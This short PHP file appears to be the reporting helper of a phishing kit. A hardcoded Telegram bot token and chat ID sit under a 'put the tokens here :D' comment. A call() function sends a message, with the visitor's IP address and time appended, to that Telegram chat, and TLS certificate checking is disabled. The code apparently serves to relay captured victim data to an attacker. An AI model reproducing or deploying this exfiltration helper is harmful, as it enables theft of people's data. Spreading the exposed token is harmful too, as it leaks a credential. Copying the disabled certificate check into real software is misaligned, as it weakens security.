<?php 

//Have a telegram bot? put the tokens here :D
$token = "7252070867:AAEmOndOoa3FbKywtyGrse0RHgOAHAZJTv8";
$id = "5219969216";



function call($msg){
    global $token;
    global $id;
    $info = "

/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}
 


?>